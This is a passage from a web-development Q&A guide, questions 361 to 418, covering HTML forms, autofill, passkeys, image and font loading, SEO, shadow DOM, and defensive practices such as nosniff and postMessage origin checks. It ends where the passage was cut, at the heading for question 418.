### 361: How do you make password manager and autofill work well?

- Use `<form>` elements, even in single-page apps.
- Use correct `type` and `autocomplete`: `username`, `current-password`, `new-password`, `one-time-code`.
- Include a username field on password reset and sign up forms (hidden with CSS if needed, with `autocomplete="username"`), so the manager knows which account to save.
- Give fields stable `name` and `id` values.
- Use `autocomplete` sections for forms with two addresses: `autocomplete="shipping street-address"` and `autocomplete="billing street-address"`.
- Don't block pasting into password fields.
- Navigate or change the URL after a successful login, so the browser offers to save the password.

### 362: How do passkeys work with HTML forms?

Passkeys use the WebAuthn API. For a smooth sign-in, you can let the browser show passkeys in the autofill dropdown of the username field ("conditional UI"):

```html
<input type="text" name="username" autocomplete="username webauthn" />
```

```js
if (await PublicKeyCredential.isConditionalMediationAvailable?.()) {
  const credential = await navigator.credentials.get({
    mediation: "conditional",
    publicKey: { challenge, rpId: "example.com" },
  });
  // send credential to the server to verify
}
```

The `webauthn` token in `autocomplete` tells the browser to include passkeys in the suggestions. The user picks one and confirms with a fingerprint, face or PIN.

### 363: How do one-time codes work with `autocomplete` and the WebOTP API?

`autocomplete="one-time-code"` lets iOS and Android suggest codes from incoming SMS (and some email clients and password managers too):

```html
<input
  name="otp"
  inputmode="numeric"
  autocomplete="one-time-code"
  pattern="\d{6}"
  maxlength="6"
/>
```

For automatic fill on Android Chrome, the WebOTP API reads the code if the SMS ends with a special line:

```text
Your code is 123456.

@example.com #123456
```

```js
const otp = await navigator.credentials.get({ otp: { transport: ["sms"] } });
input.value = otp.code;
```

Use a single input for the code, not six separate boxes, because autofill and pasting work much better with one field.

### 364: How do form-associated custom elements take part in validation?

They use `ElementInternals`:

```js
class PhoneInput extends HTMLElement {
  static formAssociated = true;
  #internals = this.attachInternals();
  #input;

  connectedCallback() {
    const root = this.attachShadow({ mode: "open", delegatesFocus: true });
    root.innerHTML = '<input type="tel">';
    this.#input = root.querySelector("input");
    this.#input.addEventListener("input", () => this.#update());
    this.#update();
  }

  #update() {
    const value = this.#input.value;
    this.#internals.setFormValue(value);
    if (this.hasAttribute("required") && !value) {
      this.#internals.setValidity(
        { valueMissing: true },
        "Enter a phone number",
        this.#input,
      );
    } else {
      this.#internals.setValidity({});
    }
  }

  checkValidity() {
    return this.#internals.checkValidity();
  }
}
customElements.define("phone-input", PhoneInput);
```

The third argument to `setValidity` is the anchor element, where the browser shows its error bubble. The form then blocks submit and `:invalid` matches the custom element.

### 365: When should form validation errors be shown?

Showing errors too early (while the user is still typing) feels aggressive. Too late (only after submit) is frustrating on long forms. A common approach:

- Validate a field when the user leaves it (`blur` / `change`), only if they changed it.
- After the first error is shown, re-validate on every `input`, so the error disappears as soon as it's fixed.
- On submit, validate everything, show an error summary at the top with links to each field, and move focus to it or to the first invalid field.

CSS `:user-invalid` follows roughly this behavior out of the box.

### 366: What is implicit submission?

When the user presses Enter inside a text field in a form, the browser submits the form, as if the first submit button was clicked.

Rules worth knowing:

- It uses the form's **first** submit button in tree order, and that button's `name`/`value` is sent. So the order of buttons matters (a "Delete" button placed first would be triggered by Enter).
- If the form has no submit button, Enter still submits if there is only one single-line text field. With more than one field and no submit button, it doesn't submit.
- If the default button is disabled, Enter doesn't submit.

This is a good reason to always use real `<form>` elements, since users expect Enter to work.

### 367: How do you handle forms with multiple submit buttons?

Give each button a `name` and `value`, and the clicked one is sent:

```html
<form method="post" action="/article">
  <input name="title" />
  <button name="intent" value="publish">Publish</button>
  <button name="intent" value="draft">Save draft</button>
</form>
```

In JavaScript, `event.submitter` tells you which button was used, and `new FormData(form, event.submitter)` includes its value. Frameworks like Remix and React Router use this "intent" pattern a lot. Remember that the first button is the default for Enter.

### 368: How does form reset work?

`form.reset()` or a `<button type="reset">` sets each field back to its **default** value:

- Text inputs: the `value` attribute (`defaultValue` property)
- Checkboxes and radios: the `checked` attribute (`defaultChecked`)
- Options: the `selected` attribute (`defaultSelected`)
- Textarea: its text content

It doesn't reset to empty. If you changed `input.value` with JavaScript, reset goes back to the attribute value, not your value. To change what reset goes back to, set `defaultValue`. Reset buttons are rarely a good idea in UI, since users click them by mistake and lose everything.

### 369: How do you prevent a form from being submitted twice?

- Disable the submit button after submit, and enable it again on error. Do it in the `submit` handler, not on `click`.
- Show a loading state on the button so users know something is happening.
- Use an idempotency key (a hidden input with a unique id per form render), so the server ignores duplicates.
- Redirect after a successful POST (Post/Redirect/Get), so refreshing the page doesn't resubmit.

```js
form.addEventListener("submit", (e) => {
  const btn = e.submitter;
  btn.disabled = true;
  btn.textContent = "Saving...";
});
```

Be careful with buttons that carry a `name`/`value` ("intent" buttons): disabled controls are left out of form data, so disabling the button too early can drop its value. Read what you need from `event.submitter` first, or use `aria-disabled="true"` and ignore extra clicks.

### 370: What is the `formdata` event?

The `formdata` event fires on a form when its data set is built: during submit, or when you call `new FormData(form)`. You can add extra entries:

```js
form.addEventListener("formdata", (event) => {
  event.formData.append(
    "timezone",
    Intl.DateTimeFormat().resolvedOptions().timeZone,
  );
});
```

Before form-associated custom elements, this was a way for custom widgets to add their values to a form without hidden inputs.

### 371: What advanced file input features are there?

- `accept`: filter by type or extension, like `accept="image/*,.pdf"`.
- `multiple`: allow several files.
- `capture`: on mobile, open the camera directly: `capture="environment"` (back camera) or `capture="user"` (front camera).
- `webkitdirectory`: select a whole folder (non-standard name but supported in all major browsers).

```html
<input type="file" accept="image/*" capture="environment" />
```

In JavaScript, `input.files` gives a `FileList`. You can read files with `file.text()`, `file.arrayBuffer()` or show a preview with `URL.createObjectURL(file)`. Remember to call `URL.revokeObjectURL()` when done, and always validate on the server.

### 372: Why must you always validate on the server even with HTML validation?

HTML validation only runs in the user's browser, so it's easy to bypass:

- Removing `required` or `maxlength` in DevTools.
- Sending requests directly with `curl` or Postman.
- Using `novalidate` or old browsers.
- Bots that never load your HTML.

Client-side validation is for user experience: quick feedback and fewer round trips. Server-side validation is for security and data integrity. They should check the same rules, and many projects share a schema (like Zod) between both sides.

### 373: How does the browser pick an image from `srcset` and `sizes`?

1. It finds the first matching media condition in `sizes` and calculates the display width in CSS pixels, for example `50vw` on a 1000px screen = 500px.
2. It multiplies by the device pixel ratio. On a 2x screen, it needs about 1000 image pixels.
3. It looks at each candidate's `w` value and picks one that is large enough.

The spec gives browsers freedom in the last step. They can pick a smaller image on slow networks or when Save-Data is on, or keep a bigger image if it's already cached. So don't rely on an exact file being chosen.

A wrong `sizes` (like leaving it at the default `100vw` for a small thumbnail) makes the browser download much bigger images than needed.

### 374: What is `sizes="auto"`?

For lazy-loaded images, the browser already knows the layout size when it starts loading the image. `sizes="auto"` lets it use that real size instead of you writing media queries:

```html
<img
  loading="lazy"
  sizes="auto, (max-width: 600px) 100vw, 400px"
  srcset="card-400.jpg 400w, card-800.jpg 800w, card-1200.jpg 1200w"
  src="card-800.jpg"
  alt="..."
  width="400"
  height="300"
/>
```

It only works with `loading="lazy"`. The fallback list after `auto` is used by browsers that don't support it. It's supported in Chromium-based browsers so far.

### 375: What is the best way to load the LCP image?

```html
<img
  src="hero-1200.avif"
  srcset="hero-800.avif 800w, hero-1200.avif 1200w, hero-2000.avif 2000w"
  sizes="100vw"
  alt="..."
  width="2000"
  height="1000"
  fetchpriority="high"
/>
```

- A real `<img>` in the initial server HTML, so the preload scanner finds it.
- `fetchpriority="high"`.
- No `loading="lazy"`.
- Small file: modern format, correct `srcset` and `sizes`.
- Same origin as the page if possible, or `preconnect` to the image CDN.
- If it can't be in the HTML (for example a CSS background), add `<link rel="preload" as="image" fetchpriority="high">`.

### 376: How do you preload a responsive image?

Use `imagesrcset` and `imagesizes` on the preload link, matching the `<img>`:

```html
<link
  rel="preload"
  as="image"
  imagesrcset="hero-800.webp 800w, hero-1200.webp 1200w, hero-2000.webp 2000w"
  imagesizes="100vw"
  fetchpriority="high"
/>
```

The browser picks the same candidate it would pick for the image, so it doesn't download two different sizes. For art direction with `<picture>`, add `media` to separate preload links. If the image is already in the HTML near the top, you usually don't need a preload at all.

### 377: How do you preload web fonts correctly?

```html
<link
  rel="preload"
  href="/fonts/inter-var.woff2"
  as="font"
  type="font/woff2"
  crossorigin
/>
```

- `as="font"` is required.
- `crossorigin` is required, even for same-origin fonts, because fonts are fetched in CORS mode. Without it, the preload is wasted and the font loads twice.
- `type` lets browsers skip formats they don't support.
- Only preload the one or two fonts used above the fold, usually WOFF2.

Combine with `font-display: swap` or `optional` in your `@font-face` to control what users see while the font loads.

### 378: What is HTTP 103 Early Hints?

The server can send a `103 Early Hints` response before the real response, with `Link` headers for important resources:

```http
HTTP/1.1 103 Early Hints
Link: </styles/main.css>; rel=preload; as=style
Link: <https://cdn.example.com>; rel=preconnect

HTTP/1.1 200 OK
Content-Type: text/html
...
```

The browser starts loading those resources while the server is still generating the HTML (for example waiting for a database). It helps most when the server has a slow "think time". It's supported in Chrome, Edge, Firefox and Safari (Safari supports only `preconnect`), and by CDNs like Cloudflare and Fastly.

### 379: What are speculation rules?

Speculation rules let you tell the browser which pages to prefetch or even fully prerender, so the next navigation is almost instant:

```html
<script type="speculationrules">
  {
    "prerender": [
      {
        "where": { "href_matches": "/products/*" },
        "eagerness": "moderate"
      }
    ],
    "prefetch": [
      {
        "where": { "selector_matches": ".nav a" },
        "eagerness": "conservative"
      }
    ]
  }
</script>
```

`eagerness` controls when: `immediate`, `eager`, `moderate` (on hover) or `conservative` (on pointer down). Prerendering runs the page's JavaScript, so make sure analytics and side effects handle it (with `document.prerendering` and the `prerenderingchange` event). It's supported in Chromium-based browsers and other browsers just ignore it.

### 380: What is the back/forward cache and what HTML or headers break it?

The bfcache keeps a full snapshot of a page in memory when the user navigates away, so pressing Back restores it instantly with the scroll position and JavaScript state.

Things that can prevent it:

- `unload` event listeners (use `pagehide` instead). Chrome is phasing out `unload`.
- `Cache-Control: no-store` on the HTML (Chrome has been relaxing this in some cases).
- Open connections like WebSockets or IndexedDB transactions at the moment of navigation.
- A page opened with `window.opener` still referenced.

You can check why a page wasn't cached in Chrome DevTools under Application > Back/forward cache. Listen to `pageshow` with `event.persisted` to refresh data when a page is restored.

### 381: How do you use `fetchpriority` with scripts and preloads?

`fetchpriority` changes priority inside the same resource type:

```html
<!-- important async script, normally low priority -->
<script src="/critical-widget.js" async fetchpriority="high"></script>

<!-- preloads are high priority by default; lower one -->
<link rel="preload" href="/below-fold.js" as="script" fetchpriority="low" />

<!-- first carousel image high, rest low -->
<img src="slide-1.jpg" alt="..." fetchpriority="high" />
<img src="slide-2.jpg" alt="..." fetchpriority="low" />
```

It's a hint, not a guarantee, and it doesn't change execution order. Use it to fix specific problems you see in the Network panel's Priority column, not on everything.

### 382: How does `content-visibility` work with HTML to speed up long pages?

`content-visibility: auto` on a section tells the browser to skip layout and paint for it while it's off-screen. The content is still in the DOM, accessible and findable with find-in-page.

```css
.article-section {
  content-visibility: auto;
  contain-intrinsic-size: auto 800px;
}
```

`contain-intrinsic-size` gives an estimated height so the scrollbar doesn't jump. It works well for long pages with many independent sections, like comment lists or documentation. `hidden="until-found"` uses a similar idea for content that is hidden but searchable.

### 383: How do you handle a very large DOM?

- **Virtualize long lists**: render only the rows on screen (TanStack Virtual, react-window).
- **Paginate or load more** instead of showing everything.
- **Render hidden UI lazily**: modals, tabs and menus only when opened.
- **Remove wrapper divs**: use CSS Grid and Flexbox gap instead of extra markup.
- **Use `content-visibility: auto`** for long static pages.
- **Avoid huge inline SVGs** repeated many times. Use `<use>` with a sprite.

Watch out: virtualization hurts find-in-page and can confuse screen readers, so set `aria-rowcount` / `aria-setsize` and test it.

### 384: What is HTML streaming and why does it help?

With streaming, the server sends the HTML in chunks as soon as each part is ready, instead of waiting to build the whole page.

The browser can parse the `<head>` and start loading CSS, fonts and scripts while the server is still fetching data for the body. Users see the header and layout earlier.

Modern frameworks do this: React Server Components and `renderToPipeableStream` stream HTML, with `<Suspense>` boundaries sending fallback content first and the real content later in the same response. Things to know: once you've sent the status code and headers you can't change them (for example to a redirect), and proxies or compression settings can buffer the stream and remove the benefit.

### 385: How can invalid HTML nesting cause hydration errors?

Server rendering produces an HTML string. The browser parses it and fixes invalid nesting. Then the framework hydrates and expects the DOM to match its virtual tree exactly. If the parser changed the structure, they don't match.

```jsx
<p>
  <div>Text</div>
</p>
```

The server sends that markup, but the browser builds `<p></p><div>Text</div><p></p>`. React then reports a hydration mismatch. Similar problems: `<tr>` directly in `<table>` (the browser adds `<tbody>`), `<a>` inside `<a>`, or a `<form>` inside a `<form>`. React warns about many of these as "In HTML, `<div>` cannot be a descendant of `<p>`".

### 386: What are the HTML differences between SSR and client-side rendering?

- **CSR**: the server sends an almost empty `<div id="root"></div>` plus scripts. Nothing shows until JS downloads and runs. Search engines and social previews may see an empty page. The preload scanner can't find images in the content.
- **SSR / static generation**: the server sends full HTML. Content shows early, links work before JavaScript, crawlers and link previews see the real content, and the LCP image is discoverable.

SSR costs server time and needs hydration, which can make the page look ready before it's interactive. Many modern apps mix them: static or server HTML for content, client components for interactive parts.

### 387: What is the "HTML over the wire" approach?

Instead of sending JSON and building HTML in the browser, the server sends ready HTML fragments, and a small library swaps them into the page. Examples are htmx, Hotwire/Turbo and Phoenix LiveView.

```html
<button hx-post="/cart/add/42" hx-target="#cart-count" hx-swap="outerHTML">
  Add to cart
</button>
<span id="cart-count">3</span>
```

The server returns `<span id="cart-count">4</span>`. Benefits: less client JavaScript, one place for rendering logic, works well with progressive enhancement. Downsides: less suited for very interactive UIs (editors, offline apps), and every interaction needs a server round trip.

### 388: How does Google handle JavaScript-rendered content?

Googlebot crawls the HTML first, then puts pages in a queue for rendering with an up-to-date headless Chromium. Content that needs JavaScript is indexed after that render step.

Things that still cause problems:

- Links built with `onclick` instead of `<a href>`. Google only follows real links.
- Content that appears only after scroll, click or user interaction.
- Blocked JS or CSS files in `robots.txt`.
- Important meta tags (title, canonical, `noindex`) changed by JavaScript, which can lead to inconsistent results.
- Very slow or failing API calls during rendering.

Other search engines and most social media crawlers don't run JavaScript at all, so SSR or prerendering is still the safest for important content.

### 389: What are common canonical tag mistakes?

- Pointing all pages of a paginated list to page 1, which hides pages 2+ from search.
- Using relative URLs, or URLs with the wrong protocol or domain.
- Canonical pointing to a URL that redirects, returns 404 or has `noindex`.
- Several canonical tags on the same page (often one from the CMS and one from a plugin).
- Canonical added with JavaScript that differs from the one in the HTML.
- Conflicts between the canonical tag, the sitemap URLs and `hreflang` links.

Each page should have one absolute canonical URL that returns 200 and is indexable.

### 390: How do you set up `hreflang` for a site with many languages and regions?

- Every language version lists all versions, including itself.
- Links must be two-way. If the German page points to the English one, the English one must point back, or search engines ignore it.
- Use language codes (`en`, `de`) and optional region codes (`en-GB`, `de-AT`). A region alone (`gb`) is invalid.
- Add `x-default` for a language picker or fallback page.
- Each URL should also have a canonical pointing to itself, not to another language version.

For large sites, putting `hreflang` in the XML sitemap is easier to maintain than adding dozens of `<link>` tags to every page.

### 391: How do you test structured data?

- **Google Rich Results Test**: shows which rich results the page is eligible for and any errors.
- **Schema Markup Validator** (validator.schema.org): checks against the full schema.org vocabulary.
- **Google Search Console**: reports structured data errors across the whole site over time.

Common problems: marking up content that isn't visible on the page, missing required properties (like `price` for `Offer`), wrong date formats, and invalid JSON (trailing commas). Google also limits which types get rich results, so not every valid schema shows something special.

### 392: Why is `user-scalable=no` in the viewport meta a problem?

```html
<!-- Bad -->
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
/>
```

It stops users from zooming in, which many people with low vision need. It fails WCAG 1.4.4 (Resize text). iOS Safari ignores it for accessibility reasons, but Android browsers may respect it.

It was often added to avoid iOS zooming in on input focus. The real fix for that is a font size of at least 16px on inputs. Also, `interactive-widget=resizes-content` in the viewport meta can control how the virtual keyboard changes the layout.

### 393: What do iframes cost in performance, and what are facades?

Each iframe is basically a whole extra page: its own HTML, CSS, JavaScript, network requests and memory. A YouTube embed alone can load over 1 MB of JavaScript.

A facade is a lightweight placeholder that looks like the embed:

```html
<button
  class="yt-facade"
  data-id="dQw4w9WgXcQ"
  aria-label="Play video: Product demo"
>
  <img
    src="https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg"
    alt=""
    loading="lazy"
  />
</button>
<script>
  document.querySelectorAll(".yt-facade").forEach((btn) => {
    btn.addEventListener("click", () => {
      const iframe = document.createElement("iframe");
      iframe.src = `https://www.youtube-nocookie.com/embed/${btn.dataset.id}?autoplay=1`;
      iframe.title = btn.getAttribute("aria-label");
      iframe.allow = "autoplay; encrypted-media; picture-in-picture";
      iframe.allowFullscreen = true;
      btn.replaceWith(iframe);
    });
  });
</script>
```

The real iframe is only loaded when the user clicks. There are ready-made components like `lite-youtube-embed`.

### 394: How do you serve different videos for different screen sizes?

You can use the `media` attribute on `<source>` inside `<video>`. It was removed from the spec at one point but has been added back and is supported in all major browsers again:

```html
<video autoplay muted loop playsinline>
  <source src="hero-mobile.mp4" media="(max-width: 600px)" type="video/mp4" />
  <source src="hero-desktop.mp4" type="video/mp4" />
</video>
```

Unlike images, the browser picks a source only when the video loads; it doesn't switch on resize. For longer videos, adaptive streaming (HLS or DASH) is better, since it switches quality based on network speed during playback.

### 395: When should you replace an animated GIF with a video?

Almost always. A short MP4 or WebM is often 5-20 times smaller than the same GIF, with better quality.

```html
<video autoplay loop muted playsinline width="480" height="270">
  <source src="demo.webm" type="video/webm" />
  <source src="demo.mp4" type="video/mp4" />
</video>
```

Add a way to pause it, and stop autoplay for users with `prefers-reduced-motion: reduce`. Another option is animated AVIF or WebP in an `<img>`, which keeps the simplicity of an image.

### 396: What does a WebVTT file look like?

```text
WEBVTT

00:00:00.000 --> 00:00:03.500
Welcome to the course.

00:00:03.500 --> 00:00:07.000 line:0 position:50% align:center
<v Nino>Let's start with HTML basics.</v>

00:00:07.000 --> 00:00:09.000
[keyboard typing]
```

Each cue has a time range and text. You can add speaker names with `<v>`, styling classes, and position settings. The file must be served with the `text/vtt` type, and if it's on another origin, the `<video>` needs `crossorigin` and the server needs CORS headers.

### 397: How does the browser figure out the character encoding of a page?

In order, the first that gives an answer:

1. A byte order mark (BOM) at the start of the file.
2. The `charset` in the `Content-Type` HTTP header.
3. A `<meta charset>` (or `http-equiv="Content-Type"`) found in the first 1024 bytes ("prescan").
4. The encoding of the parent document, for iframes.
5. Guessing based on the content and the user's locale.

If the browser finds a different `<meta charset>` later during parsing, it may have to restart parsing from the beginning. To avoid all problems: serve `charset=utf-8` in the header and put `<meta charset="utf-8">` first in `<head>`.

### 398: What is MIME sniffing and how do you stop it?

When the `Content-Type` header is missing or looks wrong, browsers used to look at the content and guess the type. Attackers abused this: they uploaded a file that looked like an image to the server but contained HTML or JavaScript, and the browser ran it.

Send this header to stop sniffing:

```http
X-Content-Type-Options: nosniff
```

With it, browsers refuse to run scripts or apply stylesheets that don't have a matching MIME type. Always set correct `Content-Type` headers, and serve user uploads from a separate domain with `Content-Disposition: attachment` where possible.

### 399: What are quirks mode, limited-quirks mode and no-quirks mode?

- **No-quirks (standards) mode**: triggered by `<!DOCTYPE html>`. Follows current CSS specs.
- **Quirks mode**: no DOCTYPE or a very old one. Emulates old browser behavior. For example, percentage heights work differently, tables don't inherit font sizes, and some CSS values without units are accepted.
- **Limited-quirks (almost standards) mode**: triggered by some old transitional DOCTYPEs. Mostly standards, except that line height inside table cells with images behaves the old way (images in cells get no gap below them).

You can check the mode in JavaScript with `document.compatMode`: `"CSS1Compat"` is standards mode, `"BackCompat"` is quirks mode. Iframes have their own mode based on their own DOCTYPE.

### 400: Why is there a gap between inline-block elements, and how is that related to HTML?

The whitespace between tags in your HTML (new lines and indentation) becomes a text node with a space. Inline and inline-block elements sit on a line of text, so that space shows up as a small gap:

```html
<nav>
  <a class="tab">One</a>
  <a class="tab">Two</a>
</nav>
```

```css
.tab {
  display: inline-block;
}
```

The fix today is to use Flexbox or Grid on the parent, where whitespace-only text nodes are ignored. The same thing explains the small gap under images: an `<img>` is inline, so it sits on the text baseline with room below for descenders. `display: block` or `vertical-align: middle` removes it.

### 401: What edge cases exist with character references?

- Some named references work without the semicolon for historical reasons, like `&copy` or `&amp`. That's a parse error, but browsers accept it.
- Inside attributes, a reference without a semicolon followed by `=` or a letter is **not** decoded. So `href="?a=1&copy=2"` stays as written, but in text `&copy=2` becomes `©=2`.
- `&` followed by something that isn't a known reference is just a literal `&`.
- Numeric references for invalid code points (like `&#0;` or surrogates) are replaced with `U+FFFD` (�).
- References are not decoded inside `<script>` and `<style>`, since those are raw text elements. In `<textarea>` and `<title>` they are.

The safe habit is to always write `&amp;` for a literal `&` in HTML, especially in URLs inside attributes.

### 402: How are relative URLs resolved, and what goes wrong with `<base>`?

Relative URLs are resolved against the document's base URL, which is the page URL unless `<base href>` is set.

Common problems with `<base>`:

- Fragment links like `href="#section"` resolve to the base URL plus the fragment, so they navigate to another page instead of scrolling.
- SVG references like `fill="url(#gradient)"` and `<use href="#icon">` can break in some browsers.
- Any relative URL that appears before the `<base>` in the document is resolved differently.
- Single-page app routers can produce wrong URLs.

`<base>` is mostly used in apps deployed under a sub-path (Angular adds `<base href="/">` by default). If you use it, use absolute paths for fragment links or handle them in JavaScript.

### 403: What is `document.domain` and why is setting it deprecated?

In the past, two pages on different subdomains (like `a.example.com` and `b.example.com`) could both set `document.domain = 'example.com'` to become same-origin and access each other's DOM.

This weakened the same-origin policy: any subdomain, including one with a vulnerability, could join. It also forced browsers to put those pages in the same process, which hurts Site Isolation against Spectre-style attacks.

Chrome now makes `document.domain` setting a no-op by default (pages are origin-keyed), unless the page sends `Origin-Agent-Cluster: ?0`. Use `postMessage` for cross-origin communication instead.

### 404: How do you safely receive messages from `postMessage`?

```js
const ALLOWED = new Set([
  "https://app.example.com",
  "https://widget.example.com",
]);

window.addEventListener("message", (event) => {
  if (!ALLOWED.has(event.origin)) return;
  if (event.source !== iframe.contentWindow) return;

  const data = event.data;
  if (typeof data !== "object" || data === null || data.type !== "resize")
    return;

  iframe.style.height = `${Number(data.height) || 0}px`;
});
```

- Check `event.origin` against an exact allow list. Don't use `includes()` or `endsWith()` on strings, since `https://example.com.evil.com` would pass.
- Check `event.source` if you only expect messages from one frame.
- Validate the data shape. Never pass it to `innerHTML`, `eval` or a URL.
- When sending, use an exact target origin, not `'*'`, if the message contains anything private.

### 405: What are the trade-offs between web components and framework components?

Web components:

- Work in any framework, or none. Good for design systems used by many teams with different stacks.
- Built into the browser, no runtime library needed (though libraries like Lit help a lot).
- Shadow DOM gives true style encapsulation.

Downsides:

- Server rendering needs Declarative Shadow DOM and is less mature than in frameworks.
- Accessibility across shadow roots is harder (ARIA id references don't cross boundaries).
- Forms need form-associated custom elements.
- Data is passed through attributes (strings) or properties; frameworks have smoother patterns for state and reactivity.
- Some frameworks still have rough edges with custom element events and properties (React 19 improved this a lot).

Framework components are usually easier inside one app. Web components shine for shared, cross-framework UI.

### 406: What are scoped custom element registries?

By default, `customElements` is one global registry per window. Two libraries that both define `<x-button>` (or two versions of the same library) clash, and the second `define()` throws an error.

Scoped registries let you create a separate `CustomElementRegistry` and attach it to a shadow root:

```js
const registry = new CustomElementRegistry();
registry.define("x-button", MyButton);

const root = host.attachShadow({
  mode: "open",
  customElementRegistry: registry,
});
root.innerHTML = "<x-button>Click</x-button>";
```

Elements inside that shadow root use the scoped registry. This is a newer feature; Safari and recent Chromium versions have shipped it, so check support before relying on it.

### 407: What are JSON and CSS module imports?

Import attributes let you import non-JavaScript files as modules:

```js
import config from "./config.json" with { type: "json" };
import sheet from "./card.css" with { type: "css" };

class MyCard extends HTMLElement {
  constructor() {
    super();
    const root = this.attachShadow({ mode: "open" });
    root.adoptedStyleSheets = [sheet];
  }
}
```

The `type` is required for safety: a server can't trick the browser into running JavaScript when you expected JSON. JSON modules are supported in all major browsers. CSS module scripts are supported in Chromium and are arriving in other browsers. "HTML modules" (importing `.html` files) were proposed but are not available.

### 408: How do you style the inside of a web component from outside?

Shadow DOM blocks page styles, but there are ways to let styles in on purpose:

- **CSS custom properties** pass through the shadow boundary:

```css
my-button {
  --button-bg: rebeccapurple;
}
```

- **`::part()`**: the component marks elements with `part="label"`, and the page can style them:

```css
my-button::part(label) {
  font-weight: 700;
}
```

- **Slotted content** stays in the light DOM, so page styles apply to it directly.
- **`:host`** and `:host(.variant)` let the component style itself based on its host element.
- **Inherited properties** like `color` and `font-family` still inherit into the shadow tree.

`::part` and custom properties form the public styling API of a component.

### 409: What is `delegatesFocus` in Shadow DOM?

When you create a shadow root with `delegatesFocus: true`, focusing the host element moves focus to the first focusable element inside the shadow tree, and clicking a non-focusable area inside also focuses that element.

```js
this.attachShadow({ mode: "open", delegatesFocus: true });
```

The host also matches `:focus` when something inside it is focused. It makes a custom element with an inner `<input>` behave like a native input when used with `.focus()`, labels or `autofocus`.

### 410: How do events behave when they cross a shadow boundary?

- **Retargeting**: when an event from inside a shadow tree is seen outside, `event.target` is changed to the host element. The page doesn't see internal elements.
- **`composed`**: only events with `composed: true` cross the shadow boundary. Most UI events (click, input, keydown, focus) are composed. Custom events are not by default.

```js
this.dispatchEvent(
  new CustomEvent("rating-change", {
    detail: { value: 4 },
    bubbles: true,
    composed: true,
  }),
);
```

`event.composedPath()` returns the full path including shadow internals (for open shadow roots). Some events, like `change` from an inner `<input>`, are not composed, so the component has to re-dispatch them.

### 411: How does light DOM vs shadow DOM content affect SEO?

Search engines that render JavaScript (like Google) flatten shadow DOM when they render, so the visible content is generally indexed. But:

- Content that exists only after JavaScript runs depends on the render step, which can be delayed or fail.
- Crawlers that don't run JavaScript see only the light DOM, which may be empty.
- Declarative Shadow DOM puts the content directly in the server HTML, which is safer.

For important content (article text, product names, headings), keep it in the light DOM and project it through slots. Then it's in the HTML no matter what.

### 412: How would you design the markup for a design-system button component?

- Render a real `<button>` (or `<a href>` when it navigates), never a `<div>`.
- Default `type="button"`, with `type="submit"` as an explicit option.
- Forward all native attributes: `disabled`, `form`, `name`, `value`, `aria-*`, `data-*`.
- For icon-only buttons, require an accessible label in the API (make `aria-label` a required prop).
- Loading state: keep the label for screen readers, show a spinner with `aria-hidden`, and use `aria-busy` or a live region to announce progress.
- Think about whether "disabled" should really be `disabled` (not focusable, no tooltip) or `aria-disabled="true"` (still focusable, can explain why).
- Visible focus style using `:focus-visible`.
- Minimum touch target size (24x24 CSS px for WCAG 2.2 AA, 44x44 recommended).

### 413: Scenario: a page gets a poor accessibility score. How do you approach it?

1. Run axe or Lighthouse to get the automatic findings: missing labels, `alt`, contrast, duplicate ids, ARIA errors.
2. Check the structure: one `<h1>`, a logical heading order, landmarks (`<header>`, `<nav>`, `<main>`, `<footer>`), `lang` on `<html>`, a good `<title>`.
3. Keyboard test the main flows: can you reach and use everything with Tab, Enter, Space, Esc and arrows? Is focus visible? Does focus go somewhere sensible after opening and closing dialogs?
4. Replace fake controls (`<div onclick>`) with real buttons and links.
5. Fix forms: labels, grouped radios, linked error messages.
6. Test with a screen reader on the key pages.
7. Add automated checks (axe in Playwright or Storybook) to CI, so the problems don't come back.

Fix by impact: blockers in key flows (login, checkout) first.

### 414: Scenario: the LCP on a marketing page is slow. What HTML changes do you look at?

1. Find the LCP element in DevTools Performance panel or PageSpeed Insights.
2. If it's an image:
   - Make it a real `<img>` in the server HTML, not a CSS background or JS-injected.
   - Remove `loading="lazy"`, add `fetchpriority="high"`.
   - Use `srcset`/`sizes` and AVIF/WebP.
   - Serve it from the same origin or `preconnect` to the CDN.
3. If it's text: check that web fonts aren't blocking it (`font-display`, preload the main font).
4. Reduce render-blocking resources: `defer` scripts, smaller CSS, inline critical CSS.
5. Check the server response time (TTFB). Use caching, a CDN, or Early Hints.
6. Look for client-side rendering. If the content waits on JavaScript, move to SSR or static generation.

Then measure again with real user data (CrUX or your RUM tool), not just lab tests.

### 415: Scenario: users complain the page jumps while loading (CLS). What do you check?

- Images and videos without `width`/`height` or `aspect-ratio`.
- Ads, embeds and iframes without reserved space. Give their containers a `min-height`.
- Banners (cookie notice, promo bar) inserted at the top after load. Overlay them or reserve space.
- Web fonts swapping and changing text size. Use `size-adjust` and the fallback font metrics, or `font-display: optional`.
- Content loaded with JavaScript and inserted above existing content.
- Animations using `top`/`height` instead of `transform`.

Use the Layout Shift regions in DevTools or the Web Vitals extension to see exactly which element moved.

### 416: Scenario: a sign-up form has a high drop-off on mobile. What HTML improvements would you make?

- Correct `type` and `inputmode` for each field so the right keyboard shows.
- Correct `autocomplete` values, so the browser fills name, email, address and phone in one tap.
- `autocomplete="new-password"` so password managers suggest a strong password.
- Visible labels above the fields, not only placeholders.
- `enterkeyhint="next"` and a logical field order.
- Fewer fields: remove what isn't needed now.
- Inline validation with clear messages, using `:user-invalid` instead of red fields on load.
- Input font size at least 16px to stop iOS zoom on focus.
- Big enough touch targets for buttons and checkboxes.
- Keep it a real `<form>` so Enter submits and autofill works.

### 417: Scenario: how would you build an accessible tabs component?

```html
<div class="tabs">
  <div role="tablist" aria-label="Account settings">
    <button role="tab" id="tab-1" aria-selected="true" aria-controls="panel-1">
      Profile
    </button>
    <button
      role="tab"
      id="tab-2"
      aria-selected="false"
      aria-controls="panel-2"
      tabindex="-1"
    >
      Security
    </button>
  </div>
  <div role="tabpanel" id="panel-1" aria-labelledby="tab-1" tabindex="0">
    ...
  </div>
  <div role="tabpanel" id="panel-2" aria-labelledby="tab-2" tabindex="0" hidden>
    ...
  </div>
</div>
```

- Roving tabindex: the selected tab has `tabindex="0"`, others `-1`.
- Left/Right arrows move between tabs, Home/End jump to the first and last.
- Update `aria-selected` and toggle `hidden` on panels.
- The panel gets `tabindex="0"` if it has no focusable content, so keyboard users can reach it.

Also ask whether you need tabs at all. If each tab is really a separate page, plain links in a `<nav>` with `aria-current="page"` are simpler and work better with the Back button.

### 418: Scenario: accordion with `<details>` or a custom one?

